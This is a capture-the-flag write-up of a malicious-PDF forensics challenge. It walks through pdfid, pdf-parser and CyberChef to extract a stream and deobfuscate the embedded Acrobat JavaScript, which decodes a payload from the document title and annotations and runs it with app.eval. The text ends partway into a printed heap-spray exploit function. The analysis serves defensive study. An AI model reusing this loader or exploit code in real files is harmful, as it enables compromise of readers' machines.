<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Cyberdefenders - GetPDF - Personal Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Personal Blog"><meta name="msapplication-TileImage" content="/images/favicons/favicon.ico"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Personal Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="GetPDF in my opinion it&amp;#39;s an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering..."><meta property="og:type" content="blog"><meta property="og:title" content="Cyberdefenders - GetPDF"><meta property="og:url" content="https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/"><meta property="og:site_name" content="Personal Blog"><meta property="og:description" content="GetPDF in my opinion it&amp;#39;s an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering..."><meta property="og:locale" content="en_US"><meta property="og:image" content="https://captwake.github.io/images/CTF_Write-Up/GetPDF/pcap1.jpg"><meta property="og:image" content="https://captwake.github.io/images/CTF_Write-Up/GetPDF/pcap2.jpg"><meta property="og:image" content="https://captwake.github.io/images/CTF_Write-Up/GetPDF/x64dbg1.png"><meta property="og:image" content="https://captwake.github.io/images/CTF_Write-Up/GetPDF/x64dbg2.png"><meta property="article:published_time" content="2022-02-17T00:00:00.000Z"><meta property="article:modified_time" content="2023-08-25T22:42:23.903Z"><meta property="article:author" content="Stefano De Rosa"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://captwake.github.io/images/CTF_Write-Up/GetPDF/pcap1.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/"},"headline":"Cyberdefenders - GetPDF","image":["https://captwake.github.io/images/CTF_Write-Up/GetPDF/pcap1.jpg","https://captwake.github.io/images/CTF_Write-Up/GetPDF/pcap2.jpg","https://captwake.github.io/images/CTF_Write-Up/GetPDF/x64dbg1.png","https://captwake.github.io/images/CTF_Write-Up/GetPDF/x64dbg2.png"],"datePublished":"2022-02-17T00:00:00.000Z","dateModified":"2023-08-25T22:42:23.903Z","author":{"@type":"Person","name":"Stefano De Rosa"},"publisher":{"@type":"Organization","name":"Personal Blog","logo":{"@type":"ImageObject","url":"https://captwake.github.io/images/favicons/favicon-16x16.png"}},"description":"GetPDF in my opinion it&#39;s an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering..."}</script><link rel="canonical" href="https://captwake.github.io/2022/02/17/2022-02-17-GetPDF/"><link rel="icon" href="/images/favicons/favicon.ico"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/favicons/favicon-16x16.png" alt="Personal Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><h1 class="title is-3 is-size-4-mobile">Cyberdefenders - GetPDF</h1><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-alt"></i> <span class="level-item"><time dateTime="2022-02-17T00:00:00.000Z" title="2/17/2022, 12:00:00 AM"> 2022-02-17</time></span><span class="level-item"><i class="far fa-folder-open has-text-grey"></i> <a class="link-muted" href="/categories/CTF-Write-Up/">CTF Write-Up</a></span><span class="level-item"><i class="far fa-clock"></i>  20 minutes read</span></div></div><div class="content"><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Hey folks, I’d like to propose this cool challenge offered by <a target="_blank" rel="noopener" href="https://twitter.com/ProjectHoneynet">The Honeynet Project</a>, GetPDF in my opinion it’s an interesting challenge that focus primarly on PDF forensic analysis and reverse engineering of some custom CVE’s implementations in JavaScript.</p>
<h2 id="PCAP-Analysis"><a href="#PCAP-Analysis" class="headerlink" title="PCAP Analysis"></a>PCAP Analysis</h2><p>First of all, I analyzed the PCAP using <code>wireshark</code>, it showed me a bunch of HTTP and DNS requests, PS: it sounds like christmas day 😃, since the challenge involves the analysis of a PDF document, I started analyze the following HTTP request:<br><img src="/images/CTF_Write-Up/GetPDF/pcap1.jpg" alt="pcap1"><br>Following the <code>TCP stream</code> I get the following content:<br><img src="/images/CTF_Write-Up/GetPDF/pcap2.jpg" alt="pcap2"></p>
<h2 id="PDF-Analysis"><a href="#PDF-Analysis" class="headerlink" title="PDF Analysis"></a>PDF Analysis</h2><p>Once extracted the PDF document, I tried to get an overview of the PDF content parsing his structure using <code>pdfid</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfid.py fcexploit.pdf</span><br><span class="line">PDFiD 0.2.5 fcexploit.pdf</span><br><span class="line"> PDF Header: %PDF-1.3</span><br><span class="line"> obj                   19</span><br><span class="line"> endobj                18</span><br><span class="line"> stream                 5</span><br><span class="line"> endstream              5</span><br><span class="line"> xref                   1</span><br><span class="line"> trailer                1</span><br><span class="line"> startxref              1</span><br><span class="line"> /Page                  2</span><br><span class="line"> /Encrypt               0</span><br><span class="line"> /ObjStm                0</span><br><span class="line"> /JS                    1</span><br><span class="line"> /JavaScript            1</span><br><span class="line"> /AA                    0</span><br><span class="line"> /OpenAction            1</span><br><span class="line"> /AcroForm              1</span><br><span class="line"> /JBIG2Decode           0</span><br><span class="line"> /RichMedia             0</span><br><span class="line"> /Launch                0</span><br><span class="line"> /EmbeddedFile          1</span><br><span class="line"> /XFA                   1</span><br><span class="line"> /Colors &gt; 2^24         0</span><br></pre></td></tr></table></figure>
<p>We can clearly see that there’s some JavaScript code inside that’s embedded in the document that’s probably will be executed when the document is opened.<br>To view what objects are involved with js code I used to launch <code>pdf-parser</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdf</span><br><span class="line">Comment: 10</span><br><span class="line">XREF: 1</span><br><span class="line">Trailer: 1</span><br><span class="line">StartXref: 1</span><br><span class="line">Indirect object: 18</span><br><span class="line">  7: 5, 7, 9, 10, 22, 23, 28</span><br><span class="line"> /Action 1: 4</span><br><span class="line"> /Annot 3: 6, 8, 24</span><br><span class="line"> /Catalog 2: 1, 27</span><br><span class="line"> /EmbeddedFile 1: 11</span><br><span class="line"> /Page 2: 3, 25</span><br><span class="line"> /Pages 2: 2, 26</span><br><span class="line">Search keywords:</span><br><span class="line"> /JS 1: 4</span><br><span class="line"> /JavaScript 1: 4</span><br><span class="line"> /OpenAction 1: 1</span><br><span class="line"> /AcroForm 1: 27</span><br><span class="line"> /EmbeddedFile 1: 11</span><br><span class="line"> /XFA 1: 28</span><br></pre></td></tr></table></figure>
<p>Digging deeply I finally found the stream:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 4 fcexploit.pdf</span><br><span class="line">obj 4 0</span><br><span class="line"> Type: /Action</span><br><span class="line"> Referencing: 5 0 R</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Action</span><br><span class="line">    /S /JavaScript</span><br><span class="line">    /JS 5 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 5 fcexploit.pdf</span><br><span class="line">obj 5 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 395</span><br><span class="line">    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]</span><br><span class="line">  &gt;&gt;</span><br></pre></td></tr></table></figure>
<p>I noticed that the stream was encoded with different filters: <code>FlateDecode, ASCII85Decode, LZWDecode, RunLengthDecode</code>; In order to decode and extract it I used <code>pdfextract</code>:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdfextract fcexploit.pdf </span><br><span class="line">/var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:416: warning: Using the last argument as keyword parameters is deprecated; maybe ** should be added to the call</span><br><span class="line">/var/lib/gems/2.7.0/gems/origami-2.1.0/lib/origami/string.rb:373: warning: The called method `initialize<span class="string">&#x27; is defined here</span></span><br><span class="line"><span class="string">[error] Object shall end with &#x27;</span>endobj<span class="string">&#x27; statement</span></span><br><span class="line"><span class="string">[error] Breaking on: &quot;&gt;&gt;/Parent ...&quot; at offset 0x60c7</span></span><br><span class="line"><span class="string">[error] Last exception: [Origami::InvalidObjectError] Failed to parse object (no:25,gen:0)</span></span><br><span class="line"><span class="string">   -&gt; [Origami::InvalidDictionaryObjectError] Invalid object for field /XObject</span></span><br><span class="line"><span class="string">Extracted 5 PDF streams to &#x27;</span>fcexploit.dump/streams<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Extracted 1 scripts to &#x27;</span>fcexploit.dump/scripts<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Extracted 0 attachments to &#x27;</span>fcexploit.dump/attachments<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Extracted 0 fonts to &#x27;</span>fcexploit.dump/fonts<span class="string">&#x27;.</span></span><br><span class="line"><span class="string">Extracted 0 images to &#x27;</span>fcexploit.dump/images<span class="string">&#x27;.</span></span><br></pre></td></tr></table></figure>
<h2 id="JS-deobfuscation"><a href="#JS-deobfuscation" class="headerlink" title="JS deobfuscation"></a>JS deobfuscation</h2><p>Using <code>de4js</code> on the extracted script gaves the following obfuscated script:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="variable constant_">SSS</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">SS</span> = <span class="string">&quot;ev&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> titleStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$5 = <span class="string">&quot;in&quot;</span>;</span><br><span class="line">app.<span class="property">doc</span>.<span class="title function_">syncAnnotScan</span>();</span><br><span class="line">S$ = <span class="string">&quot;ti&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (app.<span class="property">plugIns</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> $$ = <span class="number">0</span>;</span><br><span class="line">    S$ += <span class="string">&quot;tl&quot;</span>;</span><br><span class="line">    $5 += <span class="string">&quot;fo&quot;</span>;</span><br><span class="line">    ____SSS = app.<span class="property">doc</span>.<span class="title function_">getAnnots</span>(&#123;</span><br><span class="line">        <span class="attr">nPage</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">    S$ += <span class="string">&quot;e&quot;</span>;</span><br><span class="line">    titleStr = <span class="variable language_">this</span>.<span class="property">info</span>.<span class="property">title</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (app.<span class="property">plugIns</span>.<span class="property">length</span> &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="variable constant_">SS</span> += <span class="string">&quot;a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> arr = titleStr.<span class="title function_">split</span>(<span class="regexp">/U_155bf62c9aU_7917ab39/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> $ = <span class="number">1</span>; $ &lt; arr.<span class="property">length</span>; $++) &#123;</span><br><span class="line">        payload += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="string">&quot;0x&quot;</span> + arr[$]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable constant_">SS</span> += <span class="string">&quot;l&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>After manually deobfuscated the script results as following:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> titleStr = <span class="string">&quot;&quot;</span>;</span><br><span class="line">app.<span class="property">doc</span>.<span class="title function_">syncAnnotScan</span>();</span><br><span class="line"><span class="keyword">if</span> (app.<span class="property">plugIns</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span><br><span class="line">    annots = app.<span class="property">doc</span>.<span class="title function_">getAnnots</span>(&#123;</span><br><span class="line">        <span class="attr">nPage</span>: <span class="number">0</span></span><br><span class="line">    &#125;);</span><br><span class="line">    titleStr = <span class="variable language_">this</span>.<span class="property">info</span>.<span class="property">title</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (app.<span class="property">plugIns</span>.<span class="property">length</span> &gt; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> arr = titleStr.<span class="title function_">split</span>(<span class="regexp">/U_155bf62c9aU_7917ab39/</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> $ = <span class="number">1</span>; $ &lt; arr.<span class="property">length</span>; $++) &#123;</span><br><span class="line">        payload += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="string">&quot;0x&quot;</span> + arr[$]);</span><br><span class="line">    &#125;</span><br><span class="line">    app.<span class="built_in">eval</span>(payload);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    payload = </span></span><br><span class="line"><span class="comment">        encodedPayloadPart1 = annots[1].subject;</span></span><br><span class="line"><span class="comment">        encodedPayload = encodedPayloadPart1.replace(/X_17844743X_170987743/g, &quot;%&quot;);</span></span><br><span class="line"><span class="comment">        encodedPayloadPart2 = annots[0].subject;</span></span><br><span class="line"><span class="comment">        encodedPayload += encodedPayloadPart2.replace(/89af50d/g, &quot;%&quot;);</span></span><br><span class="line"><span class="comment">        encodedPayload = encodedPayload.replace(/\n/, &quot;&quot;);</span></span><br><span class="line"><span class="comment">        encodedPayload = encodedPayload.replace(/\r/, &quot;&quot;);</span></span><br><span class="line"><span class="comment">        decodedPayload = unescape(encodedPayload);</span></span><br><span class="line"><span class="comment">        app.eval(decodedPayload)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>This isn’t simple JavaScript, it makes use of Adobe Acrobat specific JavaScript objects and methods to refer to the currently loaded document (app.doc), to identify any “annotations” within this document (syncAnnotScan), to access the first and second annotations (getAnnots), to assign it to variables, and finally to eval (run) the code within these variables.<br>To retrieve the encoded payload, I needed to first retrieve the streams involved, for that I used <code>pdf-parser.py</code> with <code>-a</code> flag to find the annotations objects:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -a fcexploit.pdf | grep Annot</span><br><span class="line"> /Annot 3: 6, 8, 24 </span><br></pre></td></tr></table></figure>
<p>We can clearly see that the objects involved inside the payload are object 6 and 8, after analyze them we can see that contain just a reference to an object filtered stream, respectively object 7 and 9:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 6 fcexploit.pdf</span><br><span class="line">obj 6 0</span><br><span class="line"> Type: /Annot</span><br><span class="line"> Referencing: 7 0 R</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Annot</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Name /Comment</span><br><span class="line">    /Rect [ 200 250 300 320 ]</span><br><span class="line">    /Subj 7 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 7 fcexploit.pdf</span><br><span class="line">obj 7 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 8714</span><br><span class="line">    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 8 fcexploit.pdf</span><br><span class="line">obj 8 0</span><br><span class="line"> Type: /Annot</span><br><span class="line"> Referencing: 9 0 R</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Type /Annot</span><br><span class="line">    /Subtype /Text</span><br><span class="line">    /Name /Comment</span><br><span class="line">    /Rect [100 180 300 210 ]</span><br><span class="line">    /Subj 9 0 R</span><br><span class="line">  &gt;&gt;</span><br><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ pdf-parser.py -o 9 fcexploit.pdf</span><br><span class="line">obj 9 0</span><br><span class="line"> Type: </span><br><span class="line"> Referencing: </span><br><span class="line"> Contains stream</span><br><span class="line">  &lt;&lt;</span><br><span class="line">    /Length 10522</span><br><span class="line">    /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]</span><br><span class="line">  &gt;&gt;</span><br></pre></td></tr></table></figure>
<p>Now that I know which streams are contained in the payload I have to assemble the encoded payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_9.dmp &gt; stream_encoded_payload.dmp</span><br><span class="line">remnux@remnux:~/Desktop/c31-Malicious-Portable$ cat fcexploit.dump/streams/stream_7.dmp &gt;&gt; stream_encoded_payload.dmp</span><br></pre></td></tr></table></figure>
<p>Now I fired up my best friend tool (<code>Cyberchef❤️</code>) and started decoding the payload using this <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'X_17844743X_170987743'%7D,'%25',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'89af50d'%7D,'%25',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cn%7C%5C%5Cr'%7D,'%22%22',true,false,true,false)From_Hex('Auto')Generic_Code_Beautify()">recipe</a>, after some decoding routines and manually deobfuscation I get the following script:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">s</span>(<span class="params">yarsp, len</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (yarsp.<span class="property">length</span>  *  <span class="number">2</span> &lt; len)  &#123;</span><br><span class="line">        yarsp += yarsp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    yarsp = yarsp.<span class="title function_">substring</span>(<span class="number">0</span>, len  /  <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> yarsp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">common_exploit</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> chunk_size, payload, nopsled;</span><br><span class="line">    chunk_size = <span class="number">0x8000</span>;</span><br><span class="line">    <span class="comment">// calc.exe payload</span></span><br><span class="line">    payload = <span class="built_in">unescape</span>(<span 